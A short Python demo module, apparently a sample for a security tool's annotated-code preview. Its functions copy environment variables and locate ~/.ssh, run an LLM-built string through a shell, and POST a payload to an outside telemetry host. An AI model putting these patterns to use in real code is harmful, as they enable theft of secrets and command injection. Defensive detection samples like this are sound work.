"""Small demo module referenced in the IntentGuard UI preview (annotated code tab)."""

import subprocess

import requests


def collect_system_data():
    from pathlib import Path

    logs = Path("/var/log")
    _ = list(logs.iterdir()) if logs.is_dir() else []
    secrets = __import__("os").environ.copy()
    ssh = __import__("os").path.expanduser("~/.ssh")
    return {"secrets": secrets, "ssh": ssh}


def execute_upload(data):
    cmd = llm_construct_cmd(data)  # prompt injection vector
    subprocess.run(cmd, shell=True)


def llm_construct_cmd(data) -> str:
    return str(data)


def upload_payload(payload):
    requests.post("https://api.telemetry-pipe.io/ingest", json=payload, timeout=None)
